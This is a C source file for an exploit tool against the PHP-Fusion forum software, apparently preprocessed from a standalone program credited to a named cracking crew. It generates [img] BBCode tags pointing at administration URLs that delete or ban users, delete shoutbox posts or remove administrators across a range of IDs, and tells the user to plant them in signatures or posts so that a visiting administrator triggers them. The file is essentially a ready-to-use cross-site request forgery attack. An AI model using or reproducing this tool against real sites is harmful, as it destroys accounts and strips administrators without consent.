
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int atoi (char*) ;
 int exit (int) ;
 int * fopen (char*,char*) ;
 int fprintf (int *,char*,...) ;
 int printf (char*) ;
 int sprintf (char*,char*,char*,char*,char*,int) ;
 scalar_t__ strcmp (char*,char*) ;
 int strncpy (char*,char*,int) ;
 int usage () ;

int main (int argc, char *argv[]) {

   printf("\n");
   printf("PHP-Fusion [img][/img] exploit\n");
   printf("Coded by Easyex from the Dark Assassins crew\n\n");

   if(argc < 6 )
      usage();

   int i;
   char cmd[512];
   char option[512];
   char version[512];

   FILE *log;
   log = fopen("exploit.txt", "w+");

   if(log == 0) {
      printf("[-] Error opening log file.\n");
      exit(-1);;
   }

   fprintf(log, "PHP-Fusion [img][/img] exploit\n");
   fprintf(log, "Discovered/Coded by Easyex\n\n");

   if(strcmp(argv[1], "6.x") == 0) {
      strncpy(version, "administration/", 512);
   }

   else if(strcmp(argv[1], "5.x") == 0) {
      strncpy(version, "fusion_admin/", 512);
   }

   else {
      printf("[-] Error, Invalid version!\n");
      exit(-1);;
   }





   if(strcmp(argv[3], "deluser") == 0) {
      strncpy(option, "members.php?step=delete&sortby=all&rowstart=0&user_id=", 512);
      fprintf(log, "You have selected to delete %s > %s user(s)\n", argv[4], argv[5]);
   }

   else if(strcmp(argv[3], "banuser") == 0) {
      strncpy(option, "members.php?step=ban&act=on&sortby=all&rowstart=0&user_id=", 512);
      fprintf(log, "You have selected to ban %s > %s user(s)\n", argv[4], argv[5]);
   }

   else if(strcmp(argv[3], "delshout") == 0) {
      strncpy(option, "shoutbox.php?action=delete&shout_id=", 512);
      fprintf(log, "You have selected to delete %s > %s shoutbox post(s)\n", argv[4], argv[5]);
   }



   else if(strcmp(argv[3], "deladmin") == 0) {
      strncpy(option, "administrators.php?remove=", 512);
      fprintf(log, "You have selected to delete %s > %s administator(s)\n", argv[4], argv[5]);
   }

   else {
      printf("[-] Error, Invalid option!\n");
      exit(-1);
   }

   printf("[+] Generating image codes...\n\n");

   fprintf(log, "Add the following lines of code into your signature, forum post or in a comment post:\n\n");

   for (i = atoi(argv[4]); i <= atoi(argv[5]); i++) {
      sprintf(cmd, "[img]%s%s%s%d[/img]", argv[2], version, option, i);
      fprintf(log, "%s\n", cmd);
   }

   printf("[+] Completed & logged to exploit.txt\n");
   exit(1);
}
